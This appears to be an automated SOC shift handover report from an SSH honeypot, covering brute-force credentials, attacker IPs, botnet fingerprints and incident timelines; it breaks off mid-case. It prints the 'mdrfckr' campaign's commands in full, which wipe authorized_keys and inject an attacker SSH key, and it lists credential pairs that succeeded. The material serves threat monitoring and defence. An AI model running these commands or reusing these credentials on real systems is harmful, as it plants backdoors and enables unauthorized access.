# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-08-20 |
| **Generated At** | 2026-08-20T08:43:02Z |
| **Shift Time** | 08:43 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · Oracle Cloud HA · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **221** |
| Confirmed Threats | **207** |
| False Positives Filtered | **14** (6.3%) |
| Unique Attacker IPs | **66** |
| Countries of Origin | **25** |
| High Severity Cases | **66** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **155** |
| Malware Samples Analyzed | **2** HIGH · **22** MED · 20 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **78** |
| Unique Credential Pairs | **40** |
| Unique Usernames | **15** |
| Unique Passwords | **39** |
| Successful Auth Pairs | **71** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 15 |
| `nobody` | 11 |
| `postgres` | 10 |
| `admin` | 8 |
| `support` | 7 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `nobody2015` | 5 |
| `centos2016` | 5 |
| `admin2003` | 5 |
| `support` | 4 |
| `root2009` | 4 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `nobody` | `nobody2015` | 5 |
| `centos` | `centos2016` | 5 |
| `admin` | `admin2003` | 5 |
| `support` | `support` | 4 |
| `root` | `root2009` | 4 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `postgres` | `p0stgr3s` | `85.158.145.129` | 2026-08-20T04:56:25 |
| `root` | `aa112233` | `163.7.6.74` | 2026-08-20T04:58:48 |
| `345gs5662d34` | `345gs5662d34` | `163.7.6.74` | 2026-08-20T04:58:57 |
| `root` | `3245gs5662d34` | `163.7.6.74` | 2026-08-20T04:59:00 |
| `config` | `config2007` | `10.0.0.73` | 2026-08-20T04:59:17 |
| `postgres` | `p0stgres` | `85.158.145.129` | 2026-08-20T05:02:22 |
| `root` | `P@ssWord123` | `110.173.190.221` | 2026-08-20T05:05:58 |
| `nobody` | `nobody2015` | `10.0.0.73` | 2026-08-20T05:06:13 |
| `supervisor` | `654321` | `203.92.36.109` | 2026-08-20T05:08:09 |
| `postgres` | `postgres!` | `85.158.145.129` | 2026-08-20T05:08:19 |
| `support` | `support` | `176.53.159.196` | 2026-08-20T05:13:39 |
| `postgres` | `postgres!@#` | `85.158.145.129` | 2026-08-20T05:14:15 |
| `config` | `config2007` | `58.56.128.190` | 2026-08-20T05:15:50 |
| `config` | `config2007` | `196.191.142.67` | 2026-08-20T05:16:03 |
| `root` | `!234Qwer` | `110.173.190.221` | 2026-08-20T05:18:46 |
| `postgres` | `postgres01` | `85.158.145.129` | 2026-08-20T05:20:12 |
| `support` | `support2000` | `24.142.170.231` | 2026-08-20T05:20:56 |
| `centos` | `centos2016` | `10.0.0.73` | 2026-08-20T05:23:55 |
| `nobody` | `nobody2015` | `218.149.235.152` | 2026-08-20T05:24:17 |
| `nobody` | `nobody2015` | `117.223.152.94` | 2026-08-20T05:24:26 |
| `nobody` | `nobody2015` | `93.241.232.14` | 2026-08-20T05:24:35 |
| `centos` | `centos2016` | `218.95.73.31` | 2026-08-20T05:25:30 |
| `centos` | `centos2016` | `195.158.26.59` | 2026-08-20T05:25:37 |
| `postgres` | `postgres1` | `85.158.145.129` | 2026-08-20T05:26:08 |
| `root` | `Netic2025` | `216.173.112.34` | 2026-08-20T05:29:22 |
| `root` | `computer123` | `110.173.190.221` | 2026-08-20T05:31:32 |
| `postgres` | `postgres12` | `85.158.145.129` | 2026-08-20T05:32:05 |
| `postgres` | `postgres123` | `85.158.145.129` | 2026-08-20T05:38:01 |
| `support` | `support` | `10.0.0.73` | 2026-08-20T05:38:31 |
| `GET / HTTP/1.1` | `Host: 129.80.119.236:2323` | `35.203.211.88` | 2026-08-20T05:40:00 |
| `GET / HTTP/1.1` | `Host: 129.80.119.236` | `50.116.26.161` | 2026-08-20T05:40:02 |
| `centos` | `centos2016` | `39.164.94.190` | 2026-08-20T05:41:36 |
| `postgres` | `postgres@123` | `85.158.145.129` | 2026-08-20T05:43:57 |
| `root` | `Pa$$w0rt` | `110.173.190.221` | 2026-08-20T05:44:20 |
| `root` | `!Qaz@Wsx3edc4rfv` | `155.4.244.107` | 2026-08-20T05:45:38 |
| `345gs5662d34` | `345gs5662d34` | `155.4.244.107` | 2026-08-20T05:45:42 |
| `root` | `3245gs5662d34` | `155.4.244.107` | 2026-08-20T05:45:43 |
| `support` | `support2000` | `60.172.1.210` | 2026-08-20T05:49:05 |
| `support` | `support2000` | `85.105.255.56` | 2026-08-20T05:49:14 |
| `postgres` | `postgres123!@#` | `85.158.145.129` | 2026-08-20T05:49:54 |
| `GET / HTTP/1.1` | `Host: 129.80.119.236:23` | `172.236.228.224` | 2026-08-20T05:50:59 |
| `vera` | `vera123` | `131.100.242.102` | 2026-08-20T05:51:36 |
| `345gs5662d34` | `345gs5662d34` | `131.100.242.102` | 2026-08-20T05:51:39 |
| `vera` | `3245gs5662d34` | `131.100.242.102` | 2026-08-20T05:51:40 |
| `root` | `Adm1n1$trat0r` | `110.173.190.221` | 2026-08-20T05:57:07 |
| `test` | `test2012` | `220.180.171.157` | 2026-08-20T05:57:37 |
| `test` | `test2012` | `177.174.0.3` | 2026-08-20T05:57:50 |
| `test` | `test2012` | `200.232.114.71` | 2026-08-20T05:57:58 |
| `root` | `root2009` | `49.124.153.16` | 2026-08-20T05:58:54 |
| `root` | `root2009` | `178.178.222.61` | 2026-08-20T05:59:01 |
| `user` | `user2011` | `10.0.0.73` | 2026-08-20T06:05:24 |
| `admin` | `admin2003` | `10.0.0.73` | 2026-08-20T06:12:43 |
| `root` | `root2009` | `213.234.9.218` | 2026-08-20T06:14:53 |
| `root` | `root2009` | `80.233.77.136` | 2026-08-20T06:15:01 |
| `GET / HTTP/1.1` | `Host: 129.80.119.236:23` | `34.62.216.83` | 2026-08-20T06:15:42 |
| `*1` | `$4` | `34.62.216.83` | 2026-08-20T06:15:51 |
| `OPTIONS rtsp://example.com RTSP/1.0` | `Cseq: 4436` | `34.62.216.83` | 2026-08-20T06:15:53 |
| `user` | `user2011` | `120.234.232.184` | 2026-08-20T06:22:21 |
| `user` | `user2011` | `177.174.0.3` | 2026-08-20T06:22:30 |
| `admin` | `admin2004` | `223.241.214.127` | 2026-08-20T06:27:20 |
| `admin` | `admin2004` | `88.84.209.146` | 2026-08-20T06:27:28 |
| `admin` | `admin2003` | `181.212.174.164` | 2026-08-20T06:30:48 |
| `admin` | `admin2003` | `120.234.195.41` | 2026-08-20T06:30:57 |
| `admin` | `admin2003` | `202.72.196.75` | 2026-08-20T06:31:00 |
| `admin` | `admin2003` | `118.123.116.93` | 2026-08-20T06:31:11 |
| `nobody` | `nobody2007` | `153.37.177.219` | 2026-08-20T06:32:22 |
| `nobody` | `nobody2007` | `123.123.196.140` | 2026-08-20T06:32:32 |
| `admin` | `admin2004` | `10.0.0.73` | 2026-08-20T06:38:41 |
| `nobody` | `nobody123456789` | `10.0.0.73` | 2026-08-20T06:46:11 |
| `nobody` | `nobody2007` | `36.64.33.82` | 2026-08-20T06:48:07 |
| `nobody` | `nobody2007` | `196.188.93.169` | 2026-08-20T06:48:17 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **221** |
| Sessions with Fingerprint | **10** |
| Unique HASSH Fingerprints | **10** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| OpenSSH | 33 |
| Go SSH scanner | 24 |
| libssh | 14 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `acaa53e0a7d7...` | Mirai/variant | 33 | 32 |
| `98f63c4d9c87...` | Generic scanner | 10 | 1 |
| `f555226df196...` | Mirai/variant | 9 | 3 |
| `98ddc5604ef6...` | Modern SSH client | 5 | 1 |
| `4e066189c3bb...` | Generic scanner | 3 | 1 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `acaa53e0a7d7...` | OpenSSH | 33 | 32 | Mirai/variant |
| `98f63c4d9c87...` | Go SSH scanner | 10 | 1 | Generic scanner |
| `f555226df196...` | libssh | 9 | 3 | Mirai/variant |
| `98ddc5604ef6...` | Go SSH scanner | 5 | 1 | Modern SSH client |
| `95420f9d932d...` | libssh | 5 | 2 | — |
| `4e066189c3bb...` | Go SSH scanner | 3 | 1 | Generic scanner |
| `eff4c24daffc...` | Go SSH scanner | 2 | 1 | Modern SSH client |
| `0a07365cc01f...` | Go SSH scanner | 2 | 1 | Generic scanner |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **9** |
| Campaign Clusters | **1** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 3 | 3 | `T1021.004, T1078, T1070, T1140` |

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `155.4.244.107`, `163.7.6.74`, `131.100.242.102`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **66** |
| Unique ASNs | **49** |
| High-Risk ASNs | **45** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS4134` | CHINANET BACKBONE | 6 | HIGH |
| `AS63949` | Akamai Connected Cloud | 5 | HIGH |
| `AS396982` | Google LLC | 4 | HIGH |
| `AS6939` | Hurricane Electric LLC | 2 | HIGH |
| `AS24757` | Ethio Telecom | 2 | HIGH |
| `AS7922` | Comcast Cable Communications, LLC | 2 | HIGH |
| `AS9808` | China Mobile Communications Group Co., Ltd. | 2 | HIGH |
| `AS22927` | Telefonica de Argentina | 2 | LOW |

---

---

## 🚨 Priority Cases — Immediate Attention (65)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-2a0d2bdbfe04

| Field | Detail |
|---|---|
| **Source IP** | `85.158.145[.]129` |
| **First Seen** | 2026-08-20 04:56 |
| **Last Seen** | 2026-08-20 04:56 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -a` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 04:56:25` | `cowrie.session.connect` |
| `2026-08-20 04:56:25` | `cowrie.client.version` |
| `2026-08-20 04:56:25` | `cowrie.client.kex` |
| `2026-08-20 04:56:25` | `cowrie.login.success` |
| `2026-08-20 04:56:26` | `cowrie.session.params` |
| `2026-08-20 04:56:26` | `cowrie.command.input` |
| `2026-08-20 04:56:26` | `cowrie.log.closed` |
| `2026-08-20 04:56:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `85.158.145[.]129` to AbuseIPDB if not already reported
- [ ] Block `85.158.145[.]129` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-daed9aa54b4d

| Field | Detail |
|---|---|
| **Source IP** | `163.7.6[.]74` |
| **First Seen** | 2026-08-20 04:58 |
| **Last Seen** | 2026-08-20 04:59 |
| **Session Duration** | 15s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 04:58:45` | `cowrie.session.connect` |
| `2026-08-20 04:58:45` | `cowrie.client.version` |
| `2026-08-20 04:58:46` | `cowrie.client.kex` |
| `2026-08-20 04:58:48` | `cowrie.login.success` |
| `2026-08-20 04:58:50` | `cowrie.session.params` |
| `2026-08-20 04:58:50` | `cowrie.command.input` |
| `2026-08-20 04:58:50` | `cowrie.command.failed` |
| `2026-08-20 04:58:53` | `cowrie.log.closed` |
| `2026-08-20 04:58:55` | `cowrie.session.params` |
| `2026-08-20 04:58:55` | `cowrie.command.input` |
| `2026-08-20 04:58:55` | `cowrie.session.file_download` |
| `2026-08-20 04:58:55` | `cowrie.log.closed` |
| `2026-08-20 04:59:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `163.7.6[.]74` to AbuseIPDB if not already reported
- [ ] Block `163.7.6[.]74` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e16937eea1fa

| Field | Detail |
|---|---|
| **Source IP** | `163.7.6[.]74` |
| **First Seen** | 2026-08-20 04:58 |
| **Last Seen** | 2026-08-20 04:58 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 04:58:55` | `cowrie.session.connect` |
| `2026-08-20 04:58:55` | `cowrie.client.version` |
| `2026-08-20 04:58:56` | `cowrie.client.kex` |
| `2026-08-20 04:58:57` | `cowrie.login.success` |
| `2026-08-20 04:58:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `163.7.6[.]74` to AbuseIPDB if not already reported
- [ ] Block `163.7.6[.]74` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bb35ee622499

| Field | Detail |
|---|---|
| **Source IP** | `163.7.6[.]74` |
| **First Seen** | 2026-08-20 04:58 |
| **Last Seen** | 2026-08-20 04:59 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 04:58:58` | `cowrie.session.connect` |
| `2026-08-20 04:58:58` | `cowrie.client.version` |
| `2026-08-20 04:58:58` | `cowrie.client.kex` |
| `2026-08-20 04:59:00` | `cowrie.login.success` |
| `2026-08-20 04:59:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `163.7.6[.]74` to AbuseIPDB if not already reported
- [ ] Block `163.7.6[.]74` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a460435fb4ec

| Field | Detail |
|---|---|
| **Source IP** | `85.158.145[.]129` |
| **First Seen** | 2026-08-20 05:02 |
| **Last Seen** | 2026-08-20 05:02 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -a` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 05:02:21` | `cowrie.session.connect` |
| `2026-08-20 05:02:21` | `cowrie.client.version` |
| `2026-08-20 05:02:21` | `cowrie.client.kex` |
| `2026-08-20 05:02:22` | `cowrie.login.success` |
| `2026-08-20 05:02:22` | `cowrie.session.params` |
| `2026-08-20 05:02:22` | `cowrie.command.input` |
| `2026-08-20 05:02:23` | `cowrie.log.closed` |
| `2026-08-20 05:02:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `85.158.145[.]129` to AbuseIPDB if not already reported
- [ ] Block `85.158.145[.]129` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-96316fc96a9f

| Field | Detail |
|---|---|
| **Source IP** | `110.173.190[.]221` |
| **First Seen** | 2026-08-20 05:05 |
| **Last Seen** | 2026-08-20 05:06 |
| **Session Duration** | 13s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo xsec` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 05:05:51` | `cowrie.session.connect` |
| `2026-08-20 05:05:52` | `cowrie.client.version` |
| `2026-08-20 05:05:52` | `cowrie.client.kex` |
| `2026-08-20 05:05:58` | `cowrie.login.success` |
| `2026-08-20 05:06:01` | `cowrie.session.params` |
| `2026-08-20 05:06:01` | `cowrie.command.input` |
| `2026-08-20 05:06:04` | `cowrie.log.closed` |
| `2026-08-20 05:06:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `110.173.190[.]221` to AbuseIPDB if not already reported
- [ ] Block `110.173.190[.]221` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5955276f485c

| Field | Detail |
|---|---|
| **Source IP** | `203.92.36[.]109` |
| **First Seen** | 2026-08-20 05:08 |
| **Last Seen** | 2026-08-20 05:08 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 05:08:06` | `cowrie.session.connect` |
| `2026-08-20 05:08:07` | `cowrie.client.version` |
| `2026-08-20 05:08:07` | `cowrie.client.kex` |
| `2026-08-20 05:08:09` | `cowrie.login.success` |
| `2026-08-20 05:08:10` | `cowrie.direct-tcpip.request` |
| `2026-08-20 05:08:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `203.92.36[.]109` to AbuseIPDB if not already reported
- [ ] Block `203.92.36[.]109` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fefd9b9a4796

| Field | Detail |
|---|---|
| **Source IP** | `85.158.145[.]129` |
| **First Seen** | 2026-08-20 05:08 |
| **Last Seen** | 2026-08-20 05:08 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -a` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 05:08:18` | `cowrie.session.connect` |
| `2026-08-20 05:08:18` | `cowrie.client.version` |
| `2026-08-20 05:08:18` | `cowrie.client.kex` |
| `2026-08-20 05:08:19` | `cowrie.login.success` |
| `2026-08-20 05:08:19` | `cowrie.session.params` |
| `2026-08-20 05:08:19` | `cowrie.command.input` |
| `2026-08-20 05:08:20` | `cowrie.log.closed` |
| `2026-08-20 05:08:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `85.158.145[.]129` to AbuseIPDB if not already reported
- [ ] Block `85.158.145[.]129` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0bc9272e3114

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-08-20 05:13 |
| **Last Seen** | 2026-08-20 05:13 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 05:13:38` | `cowrie.session.connect` |
| `2026-08-20 05:13:38` | `cowrie.client.version` |
| `2026-08-20 05:13:38` | `cowrie.client.kex` |
| `2026-08-20 05:13:39` | `cowrie.login.success` |
| `2026-08-20 05:13:39` | `cowrie.direct-tcpip.request` |
| `2026-08-20 05:13:39` | `cowrie.direct-tcpip.data` |
| `2026-08-20 05:13:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1eb83b810434

| Field | Detail |
|---|---|
| **Source IP** | `85.158.145[.]129` |
| **First Seen** | 2026-08-20 05:14 |
| **Last Seen** | 2026-08-20 05:14 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -a` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 05:14:15` | `cowrie.session.connect` |
| `2026-08-20 05:14:15` | `cowrie.client.version` |
| `2026-08-20 05:14:15` | `cowrie.client.kex` |
| `2026-08-20 05:14:15` | `cowrie.login.success` |
| `2026-08-20 05:14:16` | `cowrie.session.params` |
| `2026-08-20 05:14:16` | `cowrie.command.input` |
| `2026-08-20 05:14:16` | `cowrie.log.closed` |
| `2026-08-20 05:14:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `85.158.145[.]129` to AbuseIPDB if not already reported
- [ ] Block `85.158.145[.]129` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-40a37800f4f9

| Field | Detail |
|---|---|
| **Source IP** | `58.56.128[.]190` |
| **First Seen** | 2026-08-20 05:15 |
| **Last Seen** | 2026-08-20 05:15 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 05:15:46` | `cowrie.session.connect` |
| `2026-08-20 05:15:47` | `cowrie.client.version` |
| `2026-08-20 05:15:47` | `cowrie.client.kex` |
| `2026-08-20 05:15:50` | `cowrie.login.success` |
| `2026-08-20 05:15:51` | `cowrie.direct-tcpip.request` |
| `2026-08-20 05:15:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `58.56.128[.]190` to AbuseIPDB if not already reported
- [ ] Block `58.56.128[.]190` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d596db53af23

| Field | Detail |
|---|---|
| **Source IP** | `196.191.142[.]67` |
| **First Seen** | 2026-08-20 05:16 |
| **Last Seen** | 2026-08-20 05:16 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 05:16:01` | `cowrie.session.connect` |
| `2026-08-20 05:16:01` | `cowrie.client.version` |
| `2026-08-20 05:16:01` | `cowrie.client.kex` |
| `2026-08-20 05:16:03` | `cowrie.login.success` |
| `2026-08-20 05:16:03` | `cowrie.direct-tcpip.request` |
| `2026-08-20 05:16:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `196.191.142[.]67` to AbuseIPDB if not already reported
- [ ] Block `196.191.142[.]67` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c5b2ea274a1a

| Field | Detail |
|---|---|
| **Source IP** | `110.173.190[.]221` |
| **First Seen** | 2026-08-20 05:18 |
| **Last Seen** | 2026-08-20 05:18 |
| **Session Duration** | 12s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo xsec` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 05:18:39` | `cowrie.session.connect` |
| `2026-08-20 05:18:40` | `cowrie.client.version` |
| `2026-08-20 05:18:40` | `cowrie.client.kex` |
| `2026-08-20 05:18:46` | `cowrie.login.success` |
| `2026-08-20 05:18:49` | `cowrie.session.params` |
| `2026-08-20 05:18:49` | `cowrie.command.input` |
| `2026-08-20 05:18:51` | `cowrie.log.closed` |
| `2026-08-20 05:18:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `110.173.190[.]221` to AbuseIPDB if not already reported
- [ ] Block `110.173.190[.]221` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-61380a3a31a8

| Field | Detail |
|---|---|
| **Source IP** | `85.158.145[.]129` |
| **First Seen** | 2026-08-20 05:20 |
| **Last Seen** | 2026-08-20 05:20 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -a` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 05:20:12` | `cowrie.session.connect` |
| `2026-08-20 05:20:12` | `cowrie.client.version` |
| `2026-08-20 05:20:12` | `cowrie.client.kex` |
| `2026-08-20 05:20:12` | `cowrie.login.success` |
| `2026-08-20 05:20:13` | `cowrie.session.params` |
| `2026-08-20 05:20:13` | `cowrie.command.input` |
| `2026-08-20 05:20:13` | `cowrie.log.closed` |
| `2026-08-20 05:20:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `85.158.145[.]129` to AbuseIPDB if not already reported
- [ ] Block `85.158.145[.]129` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-75d6f09dc71b

| Field | Detail |
|---|---|
| **Source IP** | `24.142.170[.]231` |
| **First Seen** | 2026-08-20 05:20 |
| **Last Seen** | 2026-08-20 05:21 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 05:20:54` | `cowrie.session.connect` |
| `2026-08-20 05:20:55` | `cowrie.client.version` |
| `2026-08-20 05:20:55` | `cowrie.client.kex` |
| `2026-08-20 05:20:56` | `cowrie.login.success` |
| `2026-08-20 05:20:56` | `cowrie.direct-tcpip.request` |
| `2026-08-20 05:21:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `24.142.170[.]231` to AbuseIPDB if not already reported
- [ ] Block `24.142.170[.]231` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3f02ad16b8de

| Field | Detail |
|---|---|
| **Source IP** | `218.149.235[.]152` |
| **First Seen** | 2026-08-20 05:24 |
| **Last Seen** | 2026-08-20 05:24 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
